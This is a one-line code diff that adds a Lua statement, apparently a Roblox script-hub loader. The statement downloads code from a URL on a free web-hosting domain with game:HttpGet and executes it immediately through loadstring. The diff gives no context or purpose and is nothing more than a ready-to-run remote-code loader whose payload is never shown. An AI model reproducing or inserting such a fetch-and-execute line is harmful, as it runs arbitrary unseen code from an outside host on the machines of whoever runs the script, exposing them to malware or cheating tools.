@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ochub.000webhostapp.com/index.php"))();
